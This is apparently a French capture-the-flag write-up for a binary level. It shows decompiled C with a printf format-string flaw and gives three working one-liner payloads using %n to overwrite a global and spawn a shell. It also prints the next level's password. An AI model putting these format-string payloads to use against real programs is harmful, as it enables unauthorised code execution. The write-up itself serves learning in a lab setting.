Read also: [./Resources/README.md](./Resources/README.md)

# Source

https://dogbolt.org/?id=b1a5a447-06b3-402d-a740-453263922d7a 

```c
void v(void)
{
  char local_20c [520];
 
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 64) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void)
{
  v();
  return;
}
```

# Explication

On va utiliser `%n` pour écrire dans la mémoire.

>  - %n: The number of characters written so far is stored into the integer indicated by the corresponding argument.

Voir aussi : https://www.geeksforgeeks.org/g-fact-31/ 

## 1ere solution

Pour atteindre la position de notre buffer dans printf, on doit utiliser le 4eme argument (c’est pour ça qu’on met 3 `%p`).
La position en nombre d’argument est obtenue en faisant : `aaaaaaaaaaa %p %p %p %p %p %p %p %p`, et on prend le premier
élément contenant plein de 0x61 (= 97, code ascii de la lettre a).

4 + 25 (=> final size of `%p %p %p`) + 35 = 64

```
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x804988c

$ (python -c "print('\x8c\x98\x04\x08%p%p%p' + 'a' * 35 + '%n')"; cat) | ./level3
�0x2000xb7fd1ac00xb7ff37d0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## 2eme solution

D’après le man : https://man7.org/linux/man-pages/man3/printf.3.html et https://axcheron.github.io/exploit-101-format-strings/
*"We can specify a postion to read/write on the stack with %<num>$n"*, on obtient l'alternative suivante :

On peut écrire dans le 4ème argument avec `%4$n` au lieu de `%p %p %p %n` :

```
(python -c "print('\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n')"; cat) | ./level3
```

## 3eme solution

On peut directement faire un padding avec le formatstring de printf (`%60x`). On obtient :

```
(python -c "print('\x8c\x98\x04\x08%60x%4\$n')"; cat) | ./level3
```
